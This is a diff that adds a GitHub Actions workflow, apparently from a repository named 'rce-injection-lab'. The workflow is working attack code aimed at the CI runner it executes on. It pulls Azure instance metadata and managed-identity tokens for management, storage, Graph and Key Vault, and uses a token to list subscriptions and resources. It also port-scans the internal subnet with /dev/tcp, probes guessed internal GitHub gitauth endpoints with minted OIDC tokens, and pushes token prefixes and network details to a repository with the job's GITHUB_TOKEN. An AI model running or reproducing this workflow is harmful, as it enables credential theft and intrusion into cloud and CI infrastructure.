@@ -1,0 +1,202 @@
+name: imds-managed-identity-639366
+on:
+  push:
+    branches: [main]
+
+permissions:
+  contents: write
+  id-token: write
+
+jobs:
+  imds_extraction:
+    runs-on: ubuntu-latest
+    env:
+      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: step1_imds_full
+        run: |
+          echo "=IMDS1="
+          echo "--- IMDS instance metadata ---"
+          curl -sf -H "Metadata: true"             "http://169.254.169.254/metadata/instance?api-version=2021-02-01"             | python3 -m json.tool 2>/dev/null || echo "IMDS instance: FAILED"
+
+          echo "--- IMDS network interfaces ---"
+          curl -sf -H "Metadata: true"             "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01"             | python3 -m json.tool 2>/dev/null || echo "IMDS network: FAILED"
+
+          echo "--- IMDS compute info ---"
+          curl -sf -H "Metadata: true"             "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01"             | python3 -m json.tool 2>/dev/null || echo "IMDS compute: FAILED"
+
+          echo "--- IMDS user data (cloud-init) ---"
+          curl -sf -H "Metadata: true"             "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-02-01"             2>/dev/null | base64 -d 2>/dev/null | head -c 2000 || echo "no userdata"
+
+          echo "--- IMDS tags ---"
+          curl -sf -H "Metadata: true"             "http://169.254.169.254/metadata/instance/compute/tagsList?api-version=2021-02-01"             | python3 -m json.tool 2>/dev/null || echo "no tags"
+          echo "=IMDS1_END="
+
+      - name: step2_managed_identity
+        run: |
+          echo "=IMDS2="
+          echo "--- Check for managed identity ---"
+          IDENTITIES=$(curl -sf -H "Metadata: true"             "http://169.254.169.254/metadata/identity?api-version=2021-02-01"             2>/dev/null || echo '{"error":"no identity"}')
+          echo "Identities: $IDENTITIES"
+
+          echo "--- Get token for Azure management ---"
+          MGMT_TOKEN=$(curl -sf -H "Metadata: true"             "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F"             2>/dev/null || echo '{"error":"no_token"}')
+          echo "MGMT_TOKEN: $MGMT_TOKEN" | head -c 500
+
+          echo "--- Get token for Azure storage ---"
+          STORAGE_TOKEN=$(curl -sf -H "Metadata: true"             "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https%3A%2F%2Fstorage.azure.com%2F"             2>/dev/null || echo '{"error":"no_token"}')
+          echo "STORAGE_TOKEN_LEN=${#STORAGE_TOKEN}"
+
+          echo "--- Get token for graph.microsoft.com ---"
+          GRAPH_TOKEN=$(curl -sf -H "Metadata: true"             "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https%3A%2F%2Fgraph.microsoft.com%2F"             2>/dev/null || echo '{"error":"no_token"}')
+          echo "GRAPH_TOKEN_LEN=${#GRAPH_TOKEN}"
+
+          echo "--- Get token for key vault ---"
+          VAULT_TOKEN=$(curl -sf -H "Metadata: true"             "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https%3A%2F%2Fvault.azure.com%2F"             2>/dev/null || echo '{"error":"no_token"}')
+          echo "VAULT_TOKEN_LEN=${#VAULT_TOKEN}"
+          echo "=IMDS2_END="
+
+      - name: step3_azure_api_access
+        run: |
+          echo "=IMDS3="
+          echo "--- Use Mgmt token to list subscriptions ---"
+          MGMT_RAW=$(curl -sf -H "Metadata: true"             "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F"             2>/dev/null || echo '{}')
+          MGMT_ACCESS=$(echo "$MGMT_RAW" | python3 -c "
+          import sys,json
+          d=json.load(sys.stdin)
+          print(d.get('access_token','NO_TOKEN'))
+          " 2>/dev/null || echo "PARSE_FAIL")
+
+          if [ "$MGMT_ACCESS" != "NO_TOKEN" ] && [ "$MGMT_ACCESS" != "PARSE_FAIL" ]; then
+            echo "GOT_MGMT_TOKEN (length=${#MGMT_ACCESS})"
+            echo "Token prefix: ${MGMT_ACCESS:0:100}"
+            echo "--- List subscriptions ---"
+            curl -sf               -H "Authorization: Bearer $MGMT_ACCESS"               "https://management.azure.com/subscriptions?api-version=2020-01-01"               | python3 -m json.tool 2>/dev/null | head -c 2000 || echo "sub list failed"
+
+            echo "--- Get current resource group ---"
+            COMPUTE=$(curl -sf -H "Metadata: true"               "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01"               2>/dev/null || echo '{}')
+            SUB_ID=$(echo "$COMPUTE" | python3 -c "
+            import sys,json; d=json.load(sys.stdin)
+            print(d.get('subscriptionId','UNKNOWN'))
+            " 2>/dev/null || echo "UNKNOWN")
+            RG=$(echo "$COMPUTE" | python3 -c "
+            import sys,json; d=json.load(sys.stdin)
+            print(d.get('resourceGroupName','UNKNOWN'))
+            " 2>/dev/null || echo "UNKNOWN")
+            echo "SubscriptionId: $SUB_ID"
+            echo "ResourceGroup: $RG"
+
+            if [ "$SUB_ID" != "UNKNOWN" ] && [ "$RG" != "UNKNOWN" ]; then
+              echo "--- List resources in group ---"
+              curl -sf                 -H "Authorization: Bearer $MGMT_ACCESS"                 "https://management.azure.com/subscriptions/$SUB_ID/resourceGroups/$RG/resources?api-version=2021-04-01"                 | python3 -m json.tool 2>/dev/null | head -c 3000 || echo "resource list failed"
+            fi
+          else
+            echo "No managed identity token available"
+          fi
+          echo "=IMDS3_END="
+
+      - name: step4_wider_network_scan
+        run: |
+          echo "=NET4="
+          MY_IP=$(hostname -I | awk '{print $1}')
+          GW=$(ip route show default | awk '/default/ {print $3}' | head -1)
+          SUBNET=$(echo $MY_IP | cut -d. -f1-3)
+          echo "MyIP=$MY_IP GW=$GW Subnet=$SUBNET.0/24"
+
+          echo "--- /proc/net/tcp full dump ---"
+          python3 << 'PYEOF'
+import socket, struct
+def decode(h):
+    ip_hex, port_hex = h.split(':')
+    ip = socket.inet_ntoa(struct.pack('<I', int(ip_hex, 16)))
+    port = int(port_hex, 16)
+    return ip, port
+STATE_MAP = {1:'EST', 10:'LISTEN', 8:'CLOSE_WAIT', 6:'TIME_WAIT', 2:'SYN_SENT'}
+with open('/proc/net/tcp') as f:
+    for line in f.readlines()[1:]:
+        p = line.split()
+        if len(p) > 9:
+            lip, lport = decode(p[1])
+            rip, rport = decode(p[2])
+            snum = int(p[3], 16)
+            state = STATE_MAP.get(snum, str(snum))
+            if state in ('EST', 'LISTEN'):
+                print(f'{state:8} {lip}:{lport} <-> {rip}:{rport}')
+PYEOF
+
+          echo "--- Wider subnet scan (10.1.0.0/20 → 10.1.0-15.x) ---"
+          # GitHub runner subnet appears to be 10.1.0.0/20
+          # gitauth/babeld might be on higher IPs within same /20
+          for third in $(seq 0 15); do
+            for fourth in 1 2 4 5 10 20 50 100 200 254; do
+              T="10.1.$third.$fourth"
+              for p in 8149 19418 8080 80 443; do
+                r=$(timeout 0.2 bash -c "echo '' > /dev/tcp/$T/$p" 2>/dev/null && echo "OPEN" || true)
+                [ "$r" = "OPEN" ] && echo "OPEN: $T:$p"
+              done
+            done
+          done
+          echo "=NET4_END="
+
+      - name: step5_gitauth_with_oidc
+        run: |
+          echo "=GA5="
+          echo "--- Request OIDC token for gitauth ---"
+          for AUD in gitauth "gitauth.github.com" "https://github.com" "github"; do
+            T=$(curl -sf               -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN"               "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=$AUD"               2>/dev/null | python3 -c "import sys,json; print(json.load(sys.stdin).get('value','FAIL'))" 2>/dev/null || echo "ERR")
+            echo "OIDC[$AUD]: len=${#T} prefix=${T:0:80}"
+          done
+
+          echo "--- gitauth probe with OIDC ---"
+          OIDC_RAW=$(curl -sf             -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN"             "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=gitauth"             2>/dev/null || echo '{"value":"FAIL"}')
+          OIDC_TOKEN=$(echo "$OIDC_RAW" | python3 -c "import sys,json; print(json.load(sys.stdin).get('value','FAIL'))" 2>/dev/null || echo "FAIL")
+
+          for ENDPOINT in             "https://api.github.com/_internal/gitauth/commit_refs"             "https://github.com/_gitauth/commit_refs"             "https://upload.github.com/gitauth/commit_refs"             "https://api.github.com/gitauth/commit_refs"; do
+            code=$(curl -sf --connect-timeout 2                    -H "Authorization: Bearer $OIDC_TOKEN"                    -o /tmp/oidc_r.txt -w "%{http_code}" "$ENDPOINT" 2>/dev/null || echo "000")
+            echo "OIDC gitauth: HTTP $code  $ENDPOINT"
+            if [ "$code" != "000" ] && [ "$code" != "404" ]; then
+              echo "  RESPONSE:" && head -c 300 /tmp/oidc_r.txt && echo
+            fi
+          done
+          echo "=GA5_END="
+
+      - name: step6_exfil
+        run: |
+          echo "=EX6="
+          cd /tmp
+          git clone --depth=1 -q             "https://x-access-token:$GH_TOKEN@github.com/alish244/rce-injection-lab.git"             pclone 2>/dev/null || true
+          if [ -d pclone ]; then
+            mkdir -p pclone/proof
+            IMDS_FULL=$(curl -sf -H "Metadata: true"               "http://169.254.169.254/metadata/instance?api-version=2021-02-01"               2>/dev/null || echo '{"error":"failed"}')
+            MGMT_RAW=$(curl -sf -H "Metadata: true"               "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F"               2>/dev/null || echo '{}')
+            MGMT_ACCESS=$(echo "$MGMT_RAW" | python3 -c "
+            import sys,json; d=json.load(sys.stdin); print(d.get('access_token','NO_TOKEN'))
+            " 2>/dev/null || echo "NO_TOKEN")
+            NET_INFO=$(ip route show; hostname -I; cat /etc/resolv.conf)
+            python3 -c "
+import json, os, sys
+data = {
+    'nonce': '639366',
+    'ts': '$(date -u +%Y-%m-%dT%H:%M:%SZ)',
+    'runner_ip': '$(hostname -I | awk "{print \$1}")',
+    'azure_region': 'westus3',
+    'imds_full': $IMDS_FULL,
+    'has_mgmt_token': '$MGMT_ACCESS' != 'NO_TOKEN',
+    'mgmt_token_len': len('$MGMT_ACCESS'),
+    'mgmt_token_prefix': '$MGMT_ACCESS'[:100] if '$MGMT_ACCESS' != 'NO_TOKEN' else '',
+    'network': '$NET_INFO'.replace('
+','|'),
+}
+print(json.dumps(data, indent=2))
+" > pclone/proof/imds_fullrecon_639366.json 2>/dev/null || echo '{"nonce":"639366","error":"serialize_failed"}' > pclone/proof/imds_fullrecon_639366.json
+            cd pclone
+            git config user.email "runner@github.com"
+            git config user.name "Runner"
+            git add -A
+            git commit -m "imds-recon-639366" 2>/dev/null || true
+            git push origin main 2>&1 | tail -2 || true
+            echo "COMMITTED_imds_fullrecon_639366"
+          fi
+          echo "=EX6_END="
